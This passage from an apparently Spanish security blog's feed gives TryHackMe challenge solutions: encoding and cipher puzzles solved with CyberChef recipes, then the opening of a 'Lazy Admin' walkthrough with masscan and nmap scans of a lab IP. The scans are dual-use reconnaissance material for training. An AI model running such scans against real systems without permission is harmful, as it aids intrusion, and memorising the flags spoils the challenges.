&lt;pre&gt;&lt;code&gt;aE8aZL9YYk4vQt1Zd7yaxV77wCZNkkD9DhEiAnujqBWRzyYphzsb6PVBZtCNPg9K4Sxctp2dvV76p1Qho73sLDqXvhFkNYQ4ovG5GdcWrR1wqTUCsNXBQTkpxE16j9KKqbGoSvajW4pZds8Rm2cLvuAwHxBw9BLafyUYP6NKZ9v8khk3zMvDQGDkdac3EHUy11BDEBDLM3uMNJBvqUKCprznqvBz8WhtstapDVE3CamkyBNRY4d7i92jgp4mefw8ntHEcin4kUH8CXZJHLUZGytcbGPNPatrsGPCS5L7mfRrqMPbVY21CTDmQs7qesrELzuhh7bDHqh7nk1SAqFcQj37c55PxejBMf5efP2Ju7kf1YwCu7Ac9VFVUtYQrm32UEkWihj5i2HASAZaAJ1ZWBWLwyUBJav8HH7FwCA3NzqVd5vsmTbGNk3Fb2EqeG5G1Xhn7ZQAH3RfmcnzA98RT4wgqEN7jVHhiJdZa5pgyS8bCNC56tXpn9sfrqpNhoT3mX87heTmn6p5t4BecT85PRgezBmwHgCbU5GPunkisbPtnP1PxmkWgYZ5o2c9MyyQG9osEy8JrSyZQpE5DHyHMWQnKLKAQLawq5uKjZJNQEcpmqHKRDApPfJF4VjQPiVShy9qcuFXEsApUGJ2oFkH5TziVYxsmeZSb5yg1qYJ9jN8XE4T3GBh64Jkt6YUvDFPGJh2moZW5TjSpKt9M5Jdj9qF2twkAUFDSZDNadD2Hm9iT6fBHnaortu4ENchFs91JFNWhP1MomRgYaj9u
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3- Base58 &amp;gt; Base16 &amp;gt; Base64 &amp;gt; Base10 &amp;gt; Base16&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Base58(&#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#39;,false)From_Hex(&#39;Space&#39;)From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true)From_Decimal(&#39;Space&#39;,false)From_Hex(&#39;Space&#39;)&amp;amp;input=YUU4YVpMOVlZazR2UXQxWmQ3eWF4Vjc3d0NaTmtrRDlEaEVpQW51anFCV1J6eVlwaHpzYjZQVkJadENOUGc5SzRTeGN0cDJkdlY3NnAxUWhvNzNzTERxWHZoRmtOWVE0b3ZHNUdkY1dyUjF3cVRVQ3NOWEJRVGtweEUxNmo5S0txYkdvU3Zhalc0cFpkczhSbTJjTHZ1QXdIeEJ3OUJMYWZ5VVlQNk5LWjl2OGtoazN6TXZEUUdEa2RhYzNFSFV5MTFCREVCRExNM3VNTkpCdnFVS0NwcnpucXZCejhXaHRzdGFwRFZFM0NhbWt5Qk5SWTRkN2k5MmpncDRtZWZ3OG50SEVjaW40a1VIOENYWkpITFVaR3l0Y2JHUE5QYXRyc0dQQ1M1TDdtZlJycU1QYlZZMjFDVERtUXM3cWVzckVMenVoaDdiREhxaDduazFTQXFGY1FqMzdjNTVQeGVqQk1mNWVmUDJKdTdrZjFZd0N1N0FjOVZGVlV0WVFybTMyVUVrV2loajVpMkhBU0FaYUFKMVpXQldMd3lVQkphdjhISDdGd0NBM056cVZkNXZzbVRiR05rM0ZiMkVxZUc1RzFYaG43WlFBSDNSZm1jbnpBOThSVDR3Z3FFTjdqVkhoaUpkWmE1cGd5UzhiQ05DNTZ0WHBuOXNmcnFwTmhvVDNtWDg3aGVUbW42cDV0NEJlY1Q4NVBSZ2V6Qm13SGdDYlU1R1B1bmtpc2JQdG5QMVB4bWtXZ1laNW8yYzlNeXlRRzlvc0V5OEpyU3laUXBFNURIeUhNV1FuS0xLQVFMYXdxNXVLalpKTlFFY3BtcUhLUkRBcFBmSkY0VmpRUGlWU2h5OXFjdUZYRXNBcFVHSjJvRmtINVR6aVZZeHNtZVpTYjV5ZzFxWUo5ak44WEU0VDNHQmg2NEprdDZZVXZERlBHSmgybW9aVzVUalNwS3Q5TTVKZGo5cUYydHdrQVVGRFNaRE5hZEQySG05aVQ2ZkJIbmFvcnR1NEVOY2hGczkxSkZOV2hQMU1vbVJnWWFqOXU
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;-fase-02---base-cipher-&#34;&gt;{ Fase 02 - Base, Cipher }&lt;/h2&gt;
&lt;h4 id=&#34;1easy&#34;&gt;#1[Easy]&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Reto&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PJXHQ4S7GEZV6ZTDOZQQ====
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;Base32 &amp;gt; Caesar Cipher (Shift 13) &amp;gt; &amp;quot;make_13_spin&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1- Base32&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;znxr_13_fcva
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2- Caesar Cipher (shift 13)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;make_13_spin
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;2-moderate&#34;&gt;#2 [Moderate]&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Reto&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;NjZMKVhATl1EcEI2Jio4Q0xuVy1EZSo5ZkFLV0M6QVUtPFpGQ0InIkReYg==
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;Base64 &amp;gt; Base85 &amp;gt; Vigenere Decode (key: tango)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;[Solucion - CyberChef]&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true)From_Base85(&#39;!-u&#39;)Vigen%C3%A8re_Decode(&#39;tango&#39;)&amp;amp;input=TmpaTUtWaEFUbDFFY0VJMkppbzRRMHh1VnkxRVpTbzVaa0ZMVjBNNlFWVXRQRnBHUTBJbklrUmVZZz09
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;3-hard&#34;&gt;#3 [Hard]&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Reto&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-!r/X,]n/Z-Zs\X,X$,rI&amp;lt;@]#-9Oh,-=A]R-p9\+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;Base85 &amp;gt; Rot47 &amp;gt; Base64 &amp;gt; Base32 &amp;gt; Caesar cipher ( shift 13) &amp;gt; qrpbqr_naq_ebg &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1- Base85 &amp;gt; Rot47 &amp;gt; Base64 &amp;gt; Base32 (CyberChef)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Base85(&#39;!-u&#39;)ROT47(47)From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true)From_Base32(&#39;A-Z2-7%3D&#39;,true)&amp;amp;input=LSFyL1gsXW4vWi1ac1xYLFgkLHJJPEBdIy05T2gsLT1BXVItcDlcKw
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2- Caesar Cipher (shift 13)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;qrpbqr_naq_ebg
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;4-insane&#34;&gt;#4 [Insane]&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Reto - Pastebin&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://pastebin.com/hrGp1d8T&#34;&gt;&lt;strong&gt;Pastebin&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;you are a real code cracker&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solucion&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;Base32 &amp;gt; Base85 &amp;gt; Base91 &amp;gt; Base10 &amp;gt; Base16 &amp;gt; Base64 &amp;gt; Base58 &amp;gt; Vigenere Cipher &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1- Base32 &amp;gt; Base85 (CyberChef)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Base32(&#39;A-Z2-7%3D&#39;,true)From_Base85(&#39;!-u&#39;)&amp;amp;input=R1pYU01QS1hINFJHRTRUS0dRU1ZLWVMzSEpFVUNYRE1HSlBEQVhDU0lFMlNHUVNJSUZJV1FSSlpHQlVVR0tKSkZVNFQyNERKSUZJU1FTWlNGWTRWS01LVUdaWFNJMkRMSFJSVFNYTEtHUVNWS1lTM0hVU0c0TEpRR0ZDVzRPQ09JRTJTSVpUQUdRU1NDSkxGR0JVVUdLSkpGVTRUNEozTkZOT1VHTTJCRlk0VktNS1VHWlhTTVBLWEg0UkdFNFRLR1FTVktZUzNITlFWTVhSTUdFVkZHTDJOSUUyU0lJS01JRklXT1FUUkdCVVVHS0pKRlU0VDRKM05JTVhXTVNKR0ZZNFZLTUtVR1pYU01QS1hGVVJUS05KVkdRU1ZLWVMzSE5RVk1YUk1HRlFUSVFLUElFMlNHUVNJSUZJV1FSSlpHQlVVR0tKSkZVNFQyNERKSUZJU1FUUlRGWTRWS01LVUdaWFNNUEtYRlVSVEtOSlZHUVNWS1lTM0hOUVZNWFJNR0ZDVzRPQ09JRTJTR0xLRElGSVdRWTJGR0JVVUdLSkpGVTRUNFhSS0ZOT1VHS1I2Rlk0VktNS1VHUk5DSVgyU0g0UkdFNFRLR1FTVktZUzNIVVNHNExKUUdCU0RRSlNNSUUyU0dRU0lJRklXU1FLUkdCVVVHS0pKRlU0VDRVUkdGTk9VR00yQkZZNFZLTUtVR1pYU0kzQ0tJUVhUVTRKSkdRU1ZLWVMzSUEzU1VSUzZHRlFUSVFLUElFMlNJWlRBSUZJV1FSSlpHQlVVR0tKSkZVNFQ0WFJLRk5PVUdNMkJGWTRWS01LVUdSTkNHTkxHSFJSVFNYTEtHUVNWS1lTM0hVU0c0TEpRR0ZRVElRS1BJRTJTR0xLRElGSVdTVTJaR0JVVUdLSkpGVTRUMjRESklGSVNRU1pTRlk0VktNS1VIUkVTNk5aTkg0UkdFNFRLR1FTVktZUzNIVVNHNExKUUdGUVRJUUtQSUUyU0dMS0RHUkNXQVpSSEdCVVVHS0pKRlU0VDRKM05GTk9VR0tSNkZZNFZLTUtVSFJFUzJZMk9IUlJUU1hMS0dRU1ZLWVMzSEpFVUNYRE1HSlBEQVhDU0lFMlNJSUtNSUZJV09RVFJHQlVVR0tKSkZVNFQ0SjNORk5PVUtYQlNGWTRWS01LVUhSRVMyWTJPSFJSVFNYTEtHUVNWS1lTM0lBM1NVUlM2R0ZDVzRPQ09JRTJTSUlLTUlGSVdRUkpaR0JVVUdLSkpGVTRUMjRESkZOT1VLWEJTRlk0VktNS1VHWlhTSTJETEhSUlRTWExLR1FTVktZUzNJRkhVQzJUQ0dGQ1c0T0NPSUUyU0lJS01HUkNXRVVTWUdCVVVHS0pKRlU0VDI0REpJRklTUVRSVEZZNFZLTUtVR1JOQ0lYMlNJQllXMlgzU0dRU1ZLWVMzSFVTRzRMSlFKQTNFNlpLQUlFMlNJSUtNR1FTU0NKTEZHQlVVR0tKSkZVNFQ0VVJHSU1YV01TSkdGWTRWS01LVUdSTkNHTkxHSFJSVFNYTEtHUVNWS1lTM0hKRVQ2T1JJSTVZRElYQjdJRTJTR1FTSUlGSVdPUVRSR0JVVUdLSkpGVTRUMjRESkZOT1VHS1I2Rlk0VktNS1VIUkVTNk5aTkg0UkdFNFRLR1FTVktZUzNJQTNTU01SMkdJVFU2U1NRSUUyU0lJS01JRklXU1FLUkdCVVVHS0pKRlU0VDI0REpJRklTUVNaU0ZZNFZLTUtVR1pYU01QS1hHUVVVUVhLTkdRU1ZLWVMzSFVTRzRMSlFHRkNXNE9DT0lFMlNJWlRBSUZJV1FSSlpHQlVVR0tKSkZVNFQ0VVJHR1paRlVLTElGWTRWS01LVUdSTkNJWDJTSDRSR0U0VEtHUVNWS1lTM0hKRVQ2T1JJSTVZRElYQjdJRTJTR1FTSUlGSVdTUUtSR0JVVUdLSkpGVTRUNFhSS0ZOT1VHTEo3Rlk0VktNS1VHUk5DSVgyU0lCWVcyWDNTR1FTVktZUzNISkVUNk9SSUk1WURJWEI3SUUyU0laVEFJRklXU1UyWkdCVVVHS0pKRlU0VDRYUktJRklTUVJLUA
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2- Base91&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;53 50 32 51 49 32 53 53 32 51 48 32 53 49 32 53 55 32 51 49 32 52 56 32 53 50 32 52 54 32 52 54 32 52 70 32 53 54 32 52 56 32 53 53 32 51 49 32 53 54 32 52 55 32 54 56 32 55 53 32 54 50 32 53 53 32 53 50 32 54 56 32 53 65 32 54 66 32 51 53 32 55 56 32 54 49 32 53 56 32 54 52 32 51 48 32 52 70 32 53 56 32 54 67 32 52 53 32 52 69 32 51 49 32 52 54 32 52 51 32 52 69 32 54 65 32 52 53 32 51 51 32 53 49 32 55 65 32 52 65 32 51 49 32 54 52 32 53 51 32 52 49 32 54 70 32 54 49 32 51 50 32 53 54 32 51 53 32 52 70 32 54 57 32 52 50 32 51 48 32 53 57 32 53 55 32 51 53 32 54 69 32 54 50 32 51 50 32 53 50 32 55 54 32 54 52 32 51 50 32 51 52 32 55 48
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3- Base10 &amp;gt; Base16 &amp;gt; Base64 &amp;gt; Base58 - (CyberChef)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Decimal(&#39;Space&#39;,false)From_Hex(&#39;Space&#39;)From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true)&amp;amp;input=NTMgNTAgMzIgNTEgNDkgMzIgNTMgNTMgMzIgNTEgNDggMzIgNTMgNDkgMzIgNTMgNTUgMzIgNTEgNDkgMzIgNTIgNTYgMzIgNTMgNTAgMzIgNTIgNTQgMzIgNTIgNTQgMzIgNTIgNzAgMzIgNTMgNTQgMzIgNTIgNTYgMzIgNTMgNTMgMzIgNTEgNDkgMzIgNTMgNTQgMzIgNTIgNTUgMzIgNTQgNTYgMzIgNTUgNTMgMzIgNTQgNTAgMzIgNTMgNTMgMzIgNTMgNTAgMzIgNTQgNTYgMzIgNTMgNjUgMzIgNTQgNjYgMzIgNTEgNTMgMzIgNTUgNTYgMzIgNTQgNDkgMzIgNTMgNTYgMzIgNTQgNTIgMzIgNTEgNDggMzIgNTIgNzAgMzIgNTMgNTYgMzIgNTQgNjcgMzIgNTIgNTMgMzIgNTIgNjkgMzIgNTEgNDkgMzIgNTIgNTQgMzIgNTIgNTEgMzIgNTIgNjkgMzIgNTQgNjUgMzIgNTIgNTMgMzIgNTEgNTEgMzIgNTMgNDkgMzIgNTUgNjUgMzIgNTIgNjUgMzIgNTEgNDkgMzIgNTQgNTIgMzIgNTMgNTEgMzIgNTIgNDkgMzIgNTQgNzAgMzIgNTQgNDkgMzIgNTEgNTAgMzIgNTMgNTQgMzIgNTEgNTMgMzIgNTIgNzAgMzIgNTQgNTcgMzIgNTIgNTAgMzIgNTEgNDggMzIgNTMgNTcgMzIgNTMgNTUgMzIgNTEgNTMgMzIgNTQgNjkgMzIgNTQgNTAgMzIgNTEgNTAgMzIgNTMgNTAgMzIgNTUgNTQgMzIgNTQgNTIgMzIgNTEgNTAgMzIgNTEgNTIgMzIgNTUgNDg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;4- Vigenere Cipher&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;roh gfh o nrtl purh qnnvkrx (key: tangodown)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;-fase-03---base-cipher-bit-shift-&#34;&gt;{ Fase 03 - Base, Cipher, Bit Shift }&lt;/h2&gt;
&lt;h4 id=&#34;1-moderate&#34;&gt;#1 [Moderate]&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Reto&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;2D 37 2B 19 31 99 31 B3 B2 AB A5 18 32 37 20 B3 B2 AC 2D 1A 31 B4 A1 3A A4 A3 9C B4 AD 36 AC 9E
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Block Shift Left (1 vez) &amp;gt; Base64 &amp;gt; ROT13&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1- Bock Shift Left&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakit/Screenshot%20from%202019-09-23%2022.15.52.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;2- Base64 &amp;gt; ROT13 (CyberChef)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://gchq.github.io/CyberChef/#recipe=From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true)ROT13(true,true,13)&amp;amp;input=Wm5WMmMyY2dlV0owZG5BZ2VYWjRjaUJ1SUc5aVptWT0
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;2-hard&#34;&gt;#2 [Hard]&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Reto&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;19 1A 1C 99 1C 9C A8 38 27 B2 34 27 B9 27 26 28 3C 3B AA 28 A5 AA 2A 29 3C 29 B2 B2 21 B1 AC A6 1C AC 29 A8 38 99 2C
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Hex Workshop &amp;gt; new &amp;gt; Paste Special &amp;gt; CF_TEXT Marcar &#39;Interpret as a hexadecimal string&#39; &amp;gt; Rotate to the left 8 bits &amp;gt; Base 58 &amp;gt; Caesar Cipher Shift 14&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1- Hex Workshop - Rotate Left 8 bits&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakit/Peek%202019-12-12%2021-52.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;2- Base 58&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;248389QpNehNsNLPxvUPKUTRxReeBcYM8YRQp3X
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3-  Caesar Cipher Shift 14 (dcode.fr)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fuvsg nevguzrgvp yvxr n obff
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;3-insane&#34;&gt;#3 [Insane]&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;Reto&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;A9 A8 2B EE 2A AA C9 C8 C9 AA A8 0F 2A 8A AA EE A9 8A CA A8 A9 4F 6D 46 E9 A8 A8 0F A9 8A 6D 86 A9 AA A9 26 2A 8A 48 E8
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Rotate to the left 8 bits (3 veces) &amp;gt; Base64 &amp;gt; Block Shift Left (2 veces) &amp;gt; Base85 &amp;gt; Caesar Cipher (Shift 13)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1- Rotate to the left 8 bits (3 veces)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;MEYwQUNFNUExQTUwMTVEMzk2OEExMTk4MUM1QTBG
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2- Base64&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0F0ACE5A1A5015D3968A11981C5A0F
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3- Block Shift Left (2 veces)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;+9hi@WNZ(F`qh&amp;lt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;4- Base85&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Tbq bs fuvsf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;5- Caesar Cipher (Shift 13)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;God of shifs
&lt;/code&gt;&lt;/pre&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/breakit/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/breakit/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>challenge</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Lazy Admin</title>
        <link>https://sckull.github.io/posts/lazyadmin/</link>
        <pubDate>Thu, 12 Dec 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 12 Dec 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/lazyadmin/</guid>
        <description>Lazy Admin es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Lazy Admin es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/LazyAdmin/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Lazy Admin&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Easy linux machine to practice your skills&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;385&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Relativamente Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/MrSeth6797&#34;&gt;MrSeth6797&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra dos puertos abiertos el http (80) y el ssh (22).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/lazyadmin# masscan -p1-65535,U:1-65535  10.10.68.91 -e tun0

Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-12-12 04:49:57 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 22/tcp on 10.10.68.91                                     
Discovered open port 80/tcp on 10.10.68.91 

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Dec 11 22:50:33 2019 as: nmap -sV -sC -o nmap_scan 10.10.68.91&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.68.91
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.26s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Dec 11 22:51:22 2019 -- 1 IP address (1 host up) scanned in 48.56 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;whatweb&#34;&gt;WHATWEB&lt;/h3&gt;
&lt;p&gt;Vemos que la pagina esta corriendo sobre un &lt;code&gt;Apache 2.4.18&lt;/code&gt;.&lt;/p&gt;
